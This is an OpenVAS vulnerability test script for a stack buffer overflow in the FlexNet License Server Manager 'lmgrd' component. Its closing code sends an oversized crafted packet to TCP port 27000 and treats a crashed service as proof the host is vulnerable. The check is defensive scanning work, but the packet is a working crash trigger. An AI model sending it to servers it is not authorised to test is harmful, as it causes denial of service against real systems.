###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_flexlm_lmgrd_comp_stack_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# FlexNet License Server Manager 'lmgrd' Component Stack BOF Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary code
  within the context of the affected application. Failed exploit attempts will
  result in a denial of service condition.
  Impact Level: System/Application";
tag_affected = "Flexera Software FlexNet License Server Manager versions 11.9.1 and prior";
tag_insight = "The flaw is due to an error within the License Server Manager 'lmgrd'
  component when processing certain packets. This can be exploited to cause a
  stack based buffer overflow by sending specially crafted packets to TCP port
  27000.";
tag_solution = "Upgrade to FlexNet License Server Manager version 11.10 or later,
  For updates refer to http://www.flexerasoftware.com/";
tag_summary = "This host is running FlexNet License Server Manager and is prone to
  stack buffer overflow vulnerability.";

if(description)
{
  script_id(802629);
  script_version("$Revision: 12 $");
  script_bugtraq_id(52718);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-17 16:16:16 +0530 (Thu, 17 May 2012)");
  script_name("FlexNet License Server Manager 'lmgrd' Component Stack BOF Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/81899");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18877");
  script_xref(name : "URL" , value : "http://www.flexerasoftware.com/pl/13057.htm");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/lmgrd_1-adv.txt");
  script_xref(name : "URL" , value : "http://www.zerodayinitiative.com/advisories/ZDI-12-052/");

  script_description(desc);
  script_summary("Check if FlexNet License Server Manager is vulnerable to BOF");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(27000);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Variable Initialization
soc = 0;
soc1 = 0;
port = 0;
req = "";

## lmgrd listens on TCP port 27000
port = 27000;
if(! get_port_state(port)) {
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

## Construct Attack Request
req = raw_string(0x2f, 0x24, 0x18, 0x9d, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) +
      crap(data:"a", length: 16364);

## Sending payload
send(socket: soc, data: req);
close(soc);

## Wait
sleep(5);

## Open the socket and check server is dead or alive
soc1 = open_sock_tcp(port);
if(! soc1)
{
  security_hole(port);
  exit(0);
}
close(soc1);
